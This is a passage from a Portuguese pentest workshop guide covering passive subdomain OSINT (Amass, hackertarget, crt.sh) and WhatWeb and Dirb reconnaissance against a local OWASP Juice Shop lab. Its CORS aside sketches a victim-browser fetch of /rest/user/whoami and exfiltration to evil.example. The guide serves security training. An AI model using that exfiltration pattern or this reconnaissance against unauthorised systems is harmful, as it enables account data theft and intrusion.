| Situacao | Significa falha? | O que aconteceu |
|---|---|---|
| `EXIT:0` + `No assets were discovered` | Nao | OSINT nao tinha dados para esse dominio |
| `EXIT:1` + `libpostal_data: command not found` | Sim | Dependencia ausente (Passo 2.2) |
| `EXIT:0` + linhas com `(FQDN)` | Nao | OSINT encontrou hosts publicos |

#### E o Passo 4.4 (hackertarget)?

O Amass passivo do Passo 4.2 pode retornar vazio — no lab, ate em dominios reais. A **coleta OSINT que funciona** nesta fase e o **Passo 4.4**: API `hackertarget` em `owasp.org` (comandos simples, sem Python embutido no `docker exec`).

#### Saida de referencia: quando o OSINT passivo encontra ativos (dominio real)

O bloco abaixo **nao e o que voce deve obter** no Passo 4.2 com `juice-sh.op`. E um exemplo de subdominios que o **Passo 4.4** (`crt.sh`) coleta de `owasp.org`:

```text
                                                                      v5.1.1
owasp.org (FQDN) --> a_record --> 104.20.44.163
www.owasp.org (FQDN) --> a_record --> 172.66.157.115
wiki.owasp.org (FQDN) --> cname_record --> ...
EXIT:0
12 /tmp/evidencias/workshop-05/amass-owasp-org_subdomains.txt
owasp.org
www.owasp.org
wiki.owasp.org
```

Cada linha com `(FQDN)` representa um nome encontrado em fonte externa que pode ampliar o escopo de testes autorizados. O arquivo `*_subdomains.txt` lista um subdominio por linha. Os hosts e IPs exatos podem variar conforme as fontes OSINT consultadas naquele dia.

> [!NOTE]
> No `srvdocker01`, o Amass v5.1.1 passivo costuma retornar vazio mesmo em dominios reais. A coleta que funciona nesta aula e o **Passo 4.4** (`hackertarget` + `owasp.org`).

> [!TIP]
> O Passo 4.2 mostra o fluxo do Amass no lab. Para **subdominios reais na evidencia**, avance ao **Passo 4.4.2** (`hackertarget`).

| O que voce observou | Como interpretar |
|---|---|
| `EXIT:0` e `amass-juice-sh_subdomains.txt` com linhas | Enumeracao concluida; revisar cada host antes de testar |
| `EXIT:0` e arquivo vazio ou `0 linhas` | Comando ok, mas sem novos ativos no OSINT consultado |
| `EXIT:1` com `libpostal_data: command not found` | Dependencia nao configurada; volte ao Passo 2.2 |
| `flag provided but not defined: -o` | Sintaxe do Amass v4; use `-dir` e `-oA` conforme este passo |
| Mensagem `No assets were discovered` | Execucao valida, sem expansao de superficie neste dominio |

**Como validar o Passo 4.2 (resumo):** `EXIT:0` + log gravado = passo concluido. Arquivo de subdominios vazio **nao** impede continuar para o Passo 4.3 ou para a Fase 3 (WhatWeb/Dirb).

### Passo 4.3: Interpretar resultados em laboratorio isolado

**Objetivo:** decidir se o Amass expandiu o escopo no laboratorio e encaminhar para o Passo 4.4 (coleta OSINT via `crt.sh`).

**Comando — revisar evidencias gravadas**

```bash
docker exec atacante_kali sh -lc 'echo "=== LOG ==="; tail -5 /tmp/evidencias/workshop-05/amass-execucao.txt; echo "=== SUBDOMINIOS ==="; wc -l /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt 2>/dev/null; cat /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt 2>/dev/null'
```

**Como validar:** o comando roda sem erro. Use a tabela abaixo para interpretar o conteudo.

| O que voce observou | Significa falha? | Proximo passo |
|---|---|---|
| `EXIT:0` + `No assets were discovered` | Nao | **Passo 4.4** (crt.sh) — coleta real; depois Fase 3 |
| `EXIT:0` + linhas em `_subdomains.txt` | Nao | Revisar cada host e expandir escopo de testes |
| `EXIT:1` + `libpostal_data: command not found` | Sim | Corrigir Passo 2.2 |
| `flag provided but not defined: -o` | Sim | Usar `-dir` + `-oA` (sintaxe v5) |

**Decisao para esta aula:**

```text
EXIT:0 no Passo 4.2?
    |
   sim --> OSINT trouxe subdominios?
              |
             sim --> documentar hosts e seguir para Fase 3
              |
             nao --> Passo 4.4 (crt.sh — coleta OSINT real)
                   --> Fase 3 (WhatWeb)
```

Resultado vazio com `EXIT:0` **nao interrompe a aula** — indica apenas que `juice-sh.op` nao tem presenca publica no OSINT consultado. A **coleta real de subdominios** acontece no **Passo 4.4** (API `hackertarget`).

### Passo 4.4: OSINT real (hackertarget + crt.sh)

> [!IMPORTANT]
> Este e o passo que **exemplifica coleta de verdade** nesta fase. No `srvdocker01`, o Amass v5.1.1 passivo costuma retornar vazio. O comando unico com `crt.sh` + `python3` embutido no `docker exec` **falha com frequencia** (resposta HTML `502 Bad Gateway` em vez de JSON). Por isso usamos **dois comandos simples**: primeiro `hackertarget` (confiavel), depois `crt.sh` opcional.

**Objetivo:** coletar subdominios publicos de `owasp.org` e gravar evidencia no relatorio.

**Por que nao depender so do Amass nesta aula:**

```text
Passo 4.2 (Amass + juice-sh.op)        --> fluxo da ferramenta + vazio esperado
Passo 4.4.2 (hackertarget + owasp.org) --> OSINT com retorno real (obrigatorio)
Passo 4.4.3 (crt.sh, opcional)         --> mesma familia de fonte CT; pode falhar com 502
Passo 4.5 (Amass + dominio real)         --> opcional; pode continuar vazio
```

| Ferramenta | Papel nesta fase | Retorno no lab |
|---|---|---|
| **Amass passivo** | Mostrar comando, log, `EXIT` | Frequentemente vazio |
| **hackertarget** | **Coleta OSINT principal** | ~50 subdominios em segundos |
| **crt.sh** | Fonte CT complementar | Intermitente (502); usar com retry |

**Dominio usado:** `owasp.org` — organizacao do ecossistema OWASP/Juice Shop.

#### 4.4.1 Confirmar conectividade

```bash
docker exec atacante_kali sh -lc 'getent hosts owasp.org; curl -sI --max-time 10 https://owasp.org | head -2; curl -s --max-time 15 "https://api.hackertarget.com/hostsearch/?q=owasp.org" | head -3'
```

**Como validar:** `getent` retorna IP; `owasp.org` responde HTTP; hackertarget retorna linhas `subdominio,ip` (ex.: `asvs.owasp.org,172.66.157.115`).

**Se falhar:** verifique saida do container para a internet.

#### 4.4.2 Coletar subdominios via hackertarget (obrigatorio)

> [!IMPORTANT]
> Execute estes comandos no **host** `srvdocker01` (prompt `root@srvdocker01:~#`), **nao** dentro do container `atacante_kali`. Se voce ja estiver dentro do Kali (`root@...:/#`), use a variante **B** abaixo (sem `docker exec`).

**Comando 1 — criar pasta, consultar API e gravar resposta**

```bash
docker exec atacante_kali sh -lc 'mkdir -p /tmp/evidencias/workshop-05 && curl -fsS --max-time 30 "https://api.hackertarget.com/hostsearch/?q=owasp.org" -o /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt && wc -l /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt && head -3 /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt'
```

**Comando 2 — extrair somente nomes e validar**

```bash
docker exec atacante_kali sh -lc 'test -s /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt && cut -d, -f1 /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt | sort -u > /tmp/evidencias/workshop-05/osint-owasp-org.txt && wc -l /tmp/evidencias/workshop-05/osint-owasp-org.txt && head -15 /tmp/evidencias/workshop-05/osint-owasp-org.txt'
```

**Variante B — se voce ja esta dentro do `atacante_kali` (sem `docker exec`):**

```bash
mkdir -p /tmp/evidencias/workshop-05
curl -fsS --max-time 30 "https://api.hackertarget.com/hostsearch/?q=owasp.org" -o /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt
wc -l /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt
cut -d, -f1 /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt | sort -u > /tmp/evidencias/workshop-05/osint-owasp-org.txt
wc -l /tmp/evidencias/workshop-05/osint-owasp-org.txt
head -15 /tmp/evidencias/workshop-05/osint-owasp-org.txt
```

| Parte | Funcao |
|---|---|
| `mkdir -p` | Garante que `/tmp/evidencias/workshop-05` existe (sem isso, `tee`/`cut` falham) |
| `api.hackertarget.com/hostsearch` | API publica de enumeracao passiva (sem API key) |
| `curl -fsS -o ...-raw.txt` | Grava resposta original (`host,ip` por linha); `-f` falha se HTTP der erro |
| `cut -d, -f1` | Extrai somente o nome do subdominio |
| `sort -u` | Remove duplicatas |
| `osint-owasp-org.txt` | Evidencia final para o relatorio |

**Como validar:** Comando 1 retorna `wc -l` **40+** e linhas `subdominio,ip`; Comando 2 lista nomes como `asvs.owasp.org`, `cheatsheetseries.owasp.org`, `www.owasp.org`.

| Sintoma | Causa provavel | Correcao |
|---|---|---|
| `tee: ... No such file or directory` + Comando 2 falha | Pasta de evidencias nao existe | Rode o Comando 1 **atualizado** (com `mkdir -p`) ou o Passo 2.3 |
| `cut: ... No such file or directory` | Comando 1 nao gravou o arquivo | Repita o Comando 1; confira conectividade (4.4.1) |
| `curl: (6) Could not resolve host` | Container sem DNS/internet | `docker exec atacante_kali getent hosts owasp.org` |
| `API count exceeded` (1 linha) | Cota gratuita do hackertarget esgotada | Aguarde alguns minutos e tente de novo; evidencia do Passo 4.4 ainda vale com menos linhas |
| `docker: command not found` | Voce esta **dentro** do container | Use a **Variante B** (sem `docker exec`) |

**Saida observada no ambiente de referencia (validada em 10/06/2026):**

```text
50 /tmp/evidencias/workshop-05/osint-owasp-org-raw.txt
20thanniversary.owasp.org,104.20.44.163
aivss.owasp.org,172.66.157.115
aos.owasp.org,104.20.44.163
50 /tmp/evidencias/workshop-05/osint-owasp-org.txt
20thanniversary.owasp.org
aivss.owasp.org
aos.owasp.org
asvs.owasp.org
austin.owasp.org
blt.owasp.org
board.owasp.org
brainbreak.owasp.org
calltobattle.owasp.org
cheatsheetseries.owasp.org
cheesemonkey.owasp.org
cloud.owasp.org
contact.owasp.org
copi.owasp.org
```

> [!WARNING]
> **Nao use** o comando longo com `python3 -c "..."` dentro de um unico `docker exec` para `crt.sh` — aspas aninhadas quebram no shell e, quando o `crt.sh` responde `502 Bad Gateway`, o Python falha com `JSONDecodeError` sem mensagem clara.

#### 4.4.3 Coletar via crt.sh (opcional — Certificate Transparency)

Somente se quiser demonstrar a fonte CT que o Amass tambem usaria. **Dois comandos separados** (mais confiavel):

**Comando 1 — baixar JSON com retry**

```bash
docker exec atacante_kali sh -lc 'mkdir -p /tmp/evidencias/workshop-05 && curl -fsS --max-time 120 --retry 3 --retry-delay 5 "https://crt.sh/?q=%25.owasp.org&output=json" -o /tmp/evidencias/workshop-05/crt-owasp-raw.json; wc -c /tmp/evidencias/workshop-05/crt-owasp-raw.json; head -c 40 /tmp/evidencias/workshop-05/crt-owasp-raw.json'
```

**Como validar (Comando 1):** tamanho **> 100000** bytes; inicio do arquivo = `[{"issuer_ca_id"` (JSON). Se comecar com `<html>` = `502` — pule para o Passo 4.4.4 (hackertarget ja basta).

**Comando 2 — gravar script e processar JSON (somente se Comando 1 retornou JSON)**

```bash
docker exec atacante_kali sh -lc 'cat > /tmp/evidencias/workshop-05/parse-crt.py << "PYEOF"
import json
from pathlib import Path
raw_path = Path("/tmp/evidencias/workshop-05/crt-owasp-raw.json")
out_path = Path("/tmp/evidencias/workshop-05/crtsh-owasp-org.txt")
raw = raw_path.read_text()
if raw.lstrip().startswith("<"):
    print("crt.sh retornou HTML (502) — use osint-owasp-org.txt do hackertarget")
    raise SystemExit(1)
data = json.loads(raw)
names = set()
for row in data:
    for n in row.get("name_value", "").split("\n"):
        n = n.strip().lower()
        if n.endswith(".owasp.org") or n == "owasp.org":
            names.add(n)
out_path.write_text("\n".join(sorted(names)) + "\n")
print(f"subdominios unicos: {len(names)}")
for n in sorted(names)[:20]:
    print(n)
PYEOF
python3 /tmp/evidencias/workshop-05/parse-crt.py'
```

**Como validar (Comando 2):** `subdominios unicos: 40+` e arquivo `crtsh-owasp-org.txt` criado.

#### 4.4.4 Comparar Amass (vazio) vs OSINT (com dados)

```bash
docker exec atacante_kali sh -lc 'echo "=== AMASS (juice-sh.op) ==="; wc -l /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt 2>/dev/null || echo "ausente ou vazio"; echo "=== hackertarget (owasp.org) ==="; wc -l /tmp/evidencias/workshop-05/osint-owasp-org.txt 2>/dev/null || echo "ausente — rode 4.4.2"; head -10 /tmp/evidencias/workshop-05/osint-owasp-org.txt 2>/dev/null'
```

**Narrativa para o relatorio do aluno:**

1. **4.1** — descobriu `juice-sh.op` nos artefatos do Juice Shop.
2. **4.2** — executou Amass passivo; resultado vazio no lab.
3. **4.4** — coletou subdominios reais via `hackertarget` (`osint-owasp-org.txt`).
4. **Conclusao** — ferramenta agregadora falhou/vazia; fonte OSINT direta entregou superficie.

**Como validar o Passo 4.4:** `osint-owasp-org.txt` com **40+ linhas**. Esse e o criterio de **coleta real** desta fase.

### Passo 4.5 (opcional): Amass passivo em dominio real

> [!NOTE]
> **Opcional.** Somente se quiser comparar Amass x crt.sh no mesmo dominio. No `srvdocker01`, este passo **pode retornar vazio** — nao use como unica evidencia de coleta.

> [!WARNING]
> **Somente OSINT passivo.** Sem brute force DNS. Dominios publicos ligados ao curso.

**Objetivo:** repetir o Amass do Passo 4.2 contra dominios reais e comparar com o resultado do crt.sh (Passo 4.4).

| Dominio | Quando usar | Relacao com o lab |
|---|---|---|
| `owasp-juice.shop` | Conectar ao `security.txt` (4.1) | DNS ok; Amass passivo costuma vir vazio |
| `owasp.org` | Mesmo dominio do Passo 4.4 | Amass vazio vs crt.sh com dezenas de nomes |

#### 4.5.1 Confirmar que o dominio existe na internet

Antes do Amass, valide que o nome resolve no DNS publico (fora do lab Docker):

```bash
docker exec atacante_kali sh -lc 'getent hosts owasp-juice.shop; curl -sI --max-time 10 https://owasp-juice.shop/ | head -3'
```

| Parte | Funcao |
|---|---|
| `getent hosts owasp-juice.shop` | Confirma resolucao DNS publica a partir do container |
| `curl -sI https://owasp-juice.shop/` | Confirma que o host responde na internet |

**Como validar:** `getent` retorna um IP (ex.: `81.169.145.156`); `curl` retorna cabecalhos HTTP (`HTTP/2 301` ou `200`).

**Saida observada no ambiente de referencia:**

```text
81.169.145.156  owasp-juice.shop
HTTP/2 301
location: https://juice-shop.github.io/
```

**Se falhar:** confirme conectividade de saida do `atacante_kali` (`curl -sI https://example.com`).

#### 4.5.2 Executar Amass passivo em `owasp-juice.shop`

**Comando — mesmo fluxo do Passo 4.2, trocando o dominio**

```bash
docker exec atacante_kali sh -lc 'amass enum -passive -d owasp-juice.shop -dir /tmp/evidencias/workshop-05 -oA amass-owasp-juice-real > /tmp/evidencias/workshop-05/amass-owasp-juice-real-execucao.txt 2>&1; rc=$?; tail -20 /tmp/evidencias/workshop-05/amass-owasp-juice-real-execucao.txt; echo EXIT:$rc; wc -l /tmp/evidencias/workshop-05/amass-owasp-juice-real_subdomains.txt 2>/dev/null; cat /tmp/evidencias/workshop-05/amass-owasp-juice-real_subdomains.txt 2>/dev/null | head -15'
```

**O que este comando faz (de fora para dentro):**

```text
docker exec atacante_kali          --> roda DENTRO do container atacante
        |
        v
sh -lc '...'                       --> um unico shell executa TUDO em sequencia
        |
        +-- amass enum -passive ...  --> 1) executa o Amass (pode demorar)
        |      > ...-execucao.txt    -->    grava TODA a saida no log
        |
        +-- rc=$?                    --> 2) guarda o codigo de saida do Amass
        +-- tail -20 ...             --> 3) mostra as ultimas 20 linhas do log
        +-- echo EXIT:$rc            --> 4) exibe se o Amass terminou ok (0) ou com erro
        +-- wc -l ..._subdomains.txt --> 5) conta linhas do arquivo de subdominios
        +-- cat ... | head -15       --> 6) lista ate 15 subdominios encontrados
```

| Parte | Funcao |
|---|---|
| `docker exec atacante_kali` | Executa no container atacante (onde o Amass esta instalado) |
| `sh -lc '...'` | Um unico shell — evita perder o `EXIT` real do Amass em outro `docker exec` |
| `amass enum` | Inicia enumeracao de subdominios |
| `-passive` | Somente fontes OSINT publicas — **nao** consulta DNS ao vivo nem faz brute force |
| `-d owasp-juice.shop` | Dominio real ligado ao Juice Shop (do `security.txt`, Passo 4.1) |
| `-dir /tmp/evidencias/workshop-05` | Diretorio onde o Amass grava banco e arquivos de saida |
| `-oA amass-owasp-juice-real` | Prefixo dos arquivos gerados (nao sobrescreve `amass-juice-sh*` do Passo 4.2) |
| `> ...-execucao.txt 2>&1` | Redireciona stdout **e** stderr para o log de evidencia |
| `rc=$?` | Captura o codigo de retorno **do Amass** imediatamente apos ele terminar |
| `tail -20` | Mostra o final do log (onde aparece `No assets were discovered` ou linhas `(FQDN)`) |
| `echo EXIT:$rc` | `0` = Amass concluiu sem erro de ambiente; **nao** significa que encontrou hosts |
| `wc -l ..._subdomains.txt` | Conta quantos subdominios foram gravados no arquivo |
| `cat ... \| head -15` | Exibe os nomes encontrados — **vazio** se o arquivo tem 0 linhas |

**Como validar:** `EXIT:0` + log gravado = comando executou corretamente. O arquivo `amass-owasp-juice-real_subdomains.txt` pode ter **0 linhas** — isso **nao e falha** (veja explicacao abaixo). Se aparecer `libpostal_data: command not found`, volte ao Passo 2.2.

**Saida observada no `srvdocker01` (apos Passo 2.2 com `libpostal-data`):**

```text
        @.@@.   @@@@   .@@.  .@@@@.           .@@@.    .@@.  .@@@@@@.         .@@@@.
       @.  @  @    @  @.  @ @    @  @       @    @  @.  @ @       @        @    @
       @.  @  @@@@@@  @.  @ @    @  @       @    @  @.  @ @   @@@@@@       @    @
       @.  @  @    @  @.  @ @    @  @       @    @  @.  @ @       @        @    @
        @@@@   @@@@   @@@@   @@@@   @@@@     @@@@   @@@@   @@@@@@@@          @@@@

                                                                      v5.1.1
                                           OWASP Amass Project - @owaspamass
                         In-depth Attack Surface Mapping and Asset Discovery

No assets were discovered
EXIT:0
0 /tmp/evidencias/workshop-05/amass-owasp-juice-real_subdomains.txt
```

As linhas `wc -l` e `cat` nao imprimiram nada alem do `0` — o arquivo `_subdomains.txt` existe, mas esta **vazio** (0 bytes, 0 linhas). O Amass executou com sucesso (`EXIT:0`), consultou as fontes OSINT e nao encontrou subdominios indexados para `owasp-juice.shop` naquele momento.

#### Por que `owasp-juice.shop` pode voltar vazio no Amass passivo?

Isso confunde muitos alunos porque o dominio **existe** na internet — o Passo 4.5.1 confirma com `getent` e `curl`. A coleta que funciona nesta aula esta no **Passo 4.4** (`crt.sh`). A diferenca e:

| O que voce testou | O que o Amass `-passive` consulta |
|---|---|
| DNS ao vivo (`getent`, `host demo.owasp-juice.shop`) | Bases OSINT historicas (crt.sh, agregadores, etc.) |
| O dominio resolve para `81.169.145.156` | Certificados publicados listam sobretudo `*.owasp-juice.shop` (wildcard) |
| Subdominios como `demo` existem no DNS | Esses nomes podem **nao** estar indexados nas fontes que o Amass consultou |

```text
Dominio existe no DNS?  ----sim---->  getent/curl funcionam (Passo 4.5.1)
        |
        nao e a mesma coisa que
        |
Amass v5 passivo retorna dados?  ----no lab, frequentemente nao---->  use Passo 4.4 (crt.sh)
```

**Conclusao:** resultado vazio com `EXIT:0` aqui e esperado no `srvdocker01`. A evidencia de coleta real e o arquivo `osint-owasp-org.txt` do Passo 4.4.

#### 4.5.3 Amass passivo em `owasp.org` (comparar com crt.sh)

Repita o Amass no **mesmo dominio** do Passo 4.4 para contrastar ferramenta agregadora x fonte direta:

```bash
docker exec atacante_kali sh -lc 'amass enum -passive -d owasp.org -dir /tmp/evidencias/workshop-05 -oA amass-owasp-org > /tmp/evidencias/workshop-05/amass-owasp-org-execucao.txt 2>&1; rc=$?; tail -20 /tmp/evidencias/workshop-05/amass-owasp-org-execucao.txt; echo EXIT:$rc; wc -l /tmp/evidencias/workshop-05/amass-owasp-org_subdomains.txt 2>/dev/null; cat /tmp/evidencias/workshop-05/amass-owasp-org_subdomains.txt 2>/dev/null | head -20'
```

**Como validar:** `EXIT:0` — tipicamente `_subdomains.txt` **vazio** no lab. Compare com `osint-owasp-org.txt` do Passo 4.4 (cheio).

**Comparacao esperada no relatorio:**

| Evidencia | Ferramenta | Resultado no `srvdocker01` |
|---|---|---|
| `osint-owasp-org.txt` | hackertarget (Passo 4.4) | **~50 subdominios** |
| `amass-owasp-org_subdomains.txt` | Amass v5 passivo (Passo 4.5.3) | **0 linhas** (frequente) |

### Checklist da Fase 4

| Item | Passo | Criterio de conclusao |
|---|---|---|
| Dominio alvo definido | 4.1 | `juice-sh.op` em `dominio-alvo.txt` (via API REST) |
| Amass passivo sem erro | 4.2 | `EXIT:0` + `amass-execucao.txt` gravado |
| Resultado interpretado | 4.3 | Decisao documentada (vazio = ok no lab) |
| **OSINT com coleta real** | **4.4** | **`osint-owasp-org.txt` com 40+ subdominios** |
| Amass em dominio real (opcional) | 4.5 | `EXIT:0`; comparar vazio do Amass com dados do crt.sh |

**Analise da Fase 4:** o Amass ensina o **fluxo** da ferramenta; o **crt.sh** entrega a **coleta OSINT** que funciona neste laboratorio. A Fase 3 (WhatWeb/Dirb) inicia apos o Passo 4.4.

---

## 5. Fase 3: Reconhecimento Web com WhatWeb e Dirb

Nesta fase o objetivo **nao e atacar ainda**. O analista responde duas perguntas antes de Nikto, Uniscan e `curl`:

```text
1. O QUE e essa aplicacao?     --> WhatWeb (tecnologias, cabecalhos, "impressao digital")
2. ONDE mais posso testar?     --> Dirb (caminhos nao linkados no menu principal)
```

Os resultados **nao provam vulnerabilidade sozinhos**. Eles **priorizam** onde investir tempo: quais ferramentas usar, quais URLs abrir no navegador ou testar com `curl`, e quais classes de falha merecem atencao (exposicao de arquivos, erros 500, APIs REST).

```text
WhatWeb  --> "e uma SPA moderna; scanners antigos vao ter cobertura limitada"
Dirb     --> "existe /ftp com 200 OK; vou abrir e ver o que vaza"
     |
     v
Nikto / Uniscan / curl  --> confirmar impacto (fases seguintes)
```

### Passo 5.1: Fingerprint da aplicacao com WhatWeb

**O que estamos procurando:** sinais de **tecnologia** (linguagem, framework, tipo de pagina), **cabecalhos HTTP** (protecoes presentes ou ausentes) e **comportamento** que influencie a estrategia de teste — nao uma lista pronta de CVEs.

```bash
docker exec atacante_kali sh -lc 'whatweb -a 3 http://172.18.0.30:3000/ 2>&1 | tee /tmp/evidencias/workshop-05/whatweb-juice.txt'
```

**Componentes dos comandos:**

- `whatweb`: identifica tecnologias e cabecalhos.
- `-a 3`: nivel de agressividade moderado (mais plugins, sem ser invasivo).

**Saida observada no ambiente de referencia:**

```text
http://172.18.0.30:3000/ [200 OK] HTML5, Title[OWASP Juice Shop],
Script[module], X-Frame-Options[SAMEORIGIN],
UncommonHeaders[access-control-allow-origin,x-content-type-options,feature-policy,x-recruiting]
```

#### O que cada achado significa — e o que fazer com isso

| Achado WhatWeb | O que indica | O que o analista faz em seguida | Classes de risco a considerar (nao sao CVEs automaticas) |
|---|---|---|---|
| `Title[OWASP Juice Shop]` | Alvo confirmado; aplicacao de treino com falhas intencionais | Registrar no relatorio; cruzar com escopo autorizado | N/A (contexto) |
| `HTML5` + `Script[module]` | **SPA** (Single Page App): a pagina carrega pouco HTML e o resto vem via JavaScript/API | Priorizar testes em **endpoints REST** (`/rest/...`), nao so na home; esperar cobertura **limitada** de Dirb/Nikto/Uniscan | Falhas em API (SQLi, auth bypass, IDOR, mass assignment) |
| `X-Frame-Options[SAMEORIGIN]` | Mitigacao parcial contra **clickjacking** (iframe em outro site) | Testar se outras rotas omitem o cabecalho; nao assumir protecao global | Clickjacking onde o cabecalho falta |
| `access-control-allow-origin` (valor `*` no Juice Shop) | **CORS permissivo**: com `Access-Control-Allow-Origin: *`, um site malicioso pode fazer o **browser da vitima** chamar a API e **ler a resposta** (ex.: se o token JWT estiver em `localStorage` e for enviado no cabecalho `Authorization`) | Mapear endpoints sensiveis que o front chama apos login; testar requisicao cross-origin com e sem token | Exposicao de dados via browser (contexto web) |
| `x-content-type-options` | Reduz **MIME sniffing** | Bom sinal de hardening; anotar como controle existente | Menor risco de interpretacao errada de conteudo |
| `x-recruiting` | Cabecalho customizado / easter egg do Juice Shop | Curiosidade; pode apontar para desafios ocultos (`/#/jobs`) | Exposicao de informacao leve |
| `feature-policy` | Restricao de APIs do browser (ex.: pagamento) | Entender superficie do front; raramente e vetor direto de pentest | Baixa prioridade nesta aula |

> [!NOTE]
> **Exemplo ilustrativo (CORS + endpoints sensiveis no Juice Shop):** o WhatWeb so aponta o cabecalho; o risco concreto depende de **quais APIs devolvem dados privados** quando autenticado. Dois exemplos que o proprio front usa apos o login — e que um analista colocaria na lista de teste cross-origin:
>
> | Endpoint | Metodo | Por que e sensivel (ilustracao) |
> |---|---|---|
> | `/rest/user/whoami` | `GET` | Devolve **perfil do usuario logado** (ex.: e-mail, id, papel) quando a requisicao leva o JWT no `Authorization` |
> | `/rest/basket/{id}` | `GET` | Devolve **itens do carrinho** do usuario; `{id}` e o identificador da sessao de compra — dado de negocio vinculado a conta |
>
> Cenario hipotetico: vitima logada no Juice Shop visita um site atacante; JavaScript malicioso tenta `fetch('http://172.18.0.30:3000/rest/user/whoami', { headers: { Authorization: 'Bearer ...' } })`. Com `Access-Control-Allow-Origin: *`, o browser **pode permitir** que o script leia a resposta — dependendo de como o token e armazenado e enviado.
>
> **E o que o atacante faz com esse dado coletado?**
>
> ```text
> fetch no browser da vitima  -->  JSON com e-mail, id, papel (whoami) ou itens do carrinho (basket)
>         |
>         v
> exfiltrar para servidor do atacante  (ex.: fetch('https://evil.example/log', { method:'POST', body: dados }))
>         |
>         +--> roubo de sessao: reutilizar o JWT e chamar outras APIs como se fosse a vitima
>         +--> abuso de conta: pedidos, alteracao de dados, rotas de admin se o papel permitir
>         +--> engenharia social: e-mail real para phishing direcionado
>         +--> fraude / inteligencia: historico de compras, padroes de consumo (dado de basket)
> ```
>
> Ou seja: o CORS permissivo nao e o "ataque final" — e a **ponte** que permite ao JavaScript malicioso **ler** respostas privadas da API e **enviar** esse conteudo para fora. O impacto de negocio vem do que essas APIs devolvem (identidade, carrinho, pedidos, saldo, etc.). **Nao e o foco desta aula** (nao ha laboratorio de exploit CORS aqui); serve para mostrar **por que** o achado do WhatWeb vira tarefa de mapear APIs e testar exfiltracao, nao apenas anotar um cabecalho.

**Resposta direta a "a que ataques sou suscetivel?" com o WhatWeb sozinho:**

O fingerprint **nao diz** "voce tem SQLi". Ele diz **como atacar com mais inteligencia**:

1. **SPA + Script module** → a aplicacao real esta nas **APIs**; SQLi e login bypass desta aula aparecem em `/rest/products/search` e `/rest/user/login` (Fases 7 e 8), nao necessariamente na URL `/`.
2. **CORS aberto** → em apps reais, mapear APIs como `/rest/user/whoami` e `/rest/basket/{id}` e testar se um origem externa consegue ler respostas autenticadas.
3. **Cabecalhos de seguranca mistos** → alguns controles existem; o trabalho do pentester e achar **onde faltam** (outras rotas, respostas de erro, uploads).

**Como validar o Passo 5.1:** arquivo `whatweb-juice.txt` gravado + pelo menos **duas conclusoes** no caderno/relatorio (ex.: "e SPA" e "testar APIs REST").

### Passo 5.2: Descoberta de diretorios com Dirb

**O que estamos procurando:** **caminhos HTTP** que existem no servidor mas **nao aparecem no menu** — diretorios, arquivos de configuracao, backups, paineis admin, `robots.txt`, etc. Cada `+` na saida e um **candidato a investigacao manual**.

#### Como o Dirb "adivinha" `/ftp`, `/profile`, `/promotion`?

O Dirb **nao sabe** o que existe no Juice Shop. Ele usa uma **wordlist** (lista de palavras/nomes comuns) e testa **uma por uma** na URL base:

```text
http://172.18.0.30:3000/ + palavra_da_lista

Exemplos de tentativas (simplificado):
  .../admin     --> 404 (nao listado)
  .../ftp       --> 200 (EXISTE — achado!)
  .../backup    --> 404
  .../profile   --> 500 (rota existe, mas deu erro)
  .../xyz123    --> 404
```

A palavra `ftp` apareceu porque esta no arquivo `common.txt`, nao porque alguem "soube" do Juice Shop. Em um site real, listas maiores (`big.txt`, SecLists) encontram mais caminhos — com mais tempo e mais ruido.

**Wordlist usada nesta aula:**

| Item | Valor |
|---|---|
| Caminho no Kali | `/usr/share/dirb/wordlists/common.txt` |
| Tamanho aproximado | ~4.600 entradas (`DOWNLOADED: 4612` na saida) |
| Origem | Pacote `dirb` (Debian/Kali); lista generica da comunidade |

**Outras wordlists uteis (referencia):**

| Lista | Caminho / origem | Quando usar |
|---|---|---|
| `common.txt` | `/usr/share/dirb/wordlists/common.txt` | Laboratorio rapido (esta aula) |
| `small.txt` / `big.txt` | `/usr/share/dirb/wordlists/` | Menos ou mais cobertura |
| SecLists | `apt install seclists` → `/usr/share/seclists/Discovery/Web-Content/` | Pentest real (raft, directory-list-2.3, etc.) |
| DirBuster | Listas legadas ainda usadas em `wfuzz`, `ffuf`, `gobuster` | Mesma logica, ferramentas mais novas |

```bash
docker exec atacante_kali sh -lc 'dirb http://172.18.0.30:3000/ /usr/share/dirb/wordlists/common.txt -o /tmp/evidencias/workshop-05/dirb-juice.txt -S -r 2>&1 | tee /tmp/evidencias/workshop-05/dirb-execucao.txt | tail -20'
```

**Componentes dos comandos:**

- `dirb`: brute force de diretorios/arquivos por wordlist.
- `/usr/share/dirb/wordlists/common.txt`: wordlist padrao de laboratorio.
- `-o arquivo`: salva resultado completo para o relatorio.
- `-S`: modo silencioso — mostra so respostas **positivas** (nao imprime milhares de 404).
- `-r`: nao recursivo — testa apenas `/<palavra>`, nao `/<palavra>/<subpasta>/...` (economiza tempo).

**Saida observada no ambiente de referencia (trecho relevante):**

```text
+ http://172.18.0.30:3000/ftp         (CODE:200|SIZE:11318)
+ http://172.18.0.30:3000/profile     (CODE:500|SIZE:1045)
+ http://172.18.0.30:3000/promotion   (CODE:200|SIZE:5863)
+ http://172.18.0.30:3000/redirect    (CODE:500|SIZE:3113)
+ http://172.18.0.30:3000/robots.txt  (CODE:200|SIZE:28)
+ http://172.18.0.30:3000/video       (CODE:200|SIZE:10075518)

DOWNLOADED: 4612 - FOUND: 9
```

#### O que fazer com cada achado — e a que riscos prestar atencao

| Caminho | Codigo | O que provavelmente e | Acao do analista | Risco / categoria OWASP (hipotese a validar) |
|---|---|---|---|---|
| `/ftp` | 200 | Listagem ou pagina com **arquivos expostos** | Abrir no navegador ou `curl`; listar links; baixar arquivos `.md`, `.kdbx` | **A01 Broken Access Control** / **exposicao de informacao** — **prioridade alta** (Fase 8.1) |
